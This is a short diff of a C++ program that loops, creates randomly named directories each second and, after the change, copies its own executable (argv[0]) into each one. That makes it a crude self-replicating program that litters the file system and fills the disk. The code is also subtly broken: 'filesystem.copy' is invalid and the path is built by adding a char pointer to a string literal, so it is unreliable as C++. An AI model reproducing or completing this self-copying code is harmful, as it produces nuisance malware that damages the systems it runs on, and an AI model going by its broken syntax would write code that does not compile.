@@ -17,7 +17,7 @@ char genRandom() {
     return alphanum[rand() % len];
 }
 
-int main() {
+int main(int argc, char** argv) {
     
     string name;
     string cwd = filesystem::current_path();
@@ -33,7 +33,7 @@ int main() {
         this_thread::sleep_for(chrono::seconds(1));
         mkdir(name);
         chdir(name);
-        filesystem.copy("../", filesystem::current_path());
+        filesystem.copy("../" + argv[0], filesystem::current_path());
         chdir(cwd);
         ++count;
     }
